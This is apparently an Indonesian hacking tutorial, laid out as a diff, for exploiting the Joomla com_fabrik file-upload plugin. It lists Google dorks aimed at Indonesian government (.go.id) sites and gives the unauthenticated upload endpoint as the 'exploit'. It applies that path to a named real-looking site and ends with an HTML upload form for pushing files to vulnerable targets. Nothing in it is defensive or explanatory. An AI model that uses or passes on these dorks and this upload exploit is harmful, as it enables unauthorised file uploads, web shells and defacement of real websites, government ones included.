@@ -1,0 +1,32 @@
+Dork : 
+inurl:index.php?option=com_fabrik
+inurl:index.php/component/fabrik/ site:go.id
+inurl:index.php?option=com_fabrik&view= site:go.id
+inurl:importcsv.php site:go.id
+
+Exploit : index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+Nah + exploit nya lurrr
+
+Nah itu saja,kita dorking dulu di google
+
+Seperti biasa kita Dork king dulu
+
+http://www.12dnacodeofgod.com/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+
+Nah gitu,lu + exploit nya 
+
+Csrf : 
+<title>aafIndoTutors</title>
+<br>
+<br>
+<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+<body BGCOLOR="Black">
+<Font Color="green" Face="courier new"><font size="8">CSRF By:  aafIndoTutors</h1><br><br>
+	<form method="POST" action="http://sitecontoh.com/xploit" enctype="multipart/form-data">
+	<input type="file" name="file"><button>Gas kenn</button>
+	</form>
+</center><br></font>
+<Font Color="green" Face="courier new"<font size="4">Dork: inurl:/Com_Fabrik Site:go.id<br>
+Exploit: /index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
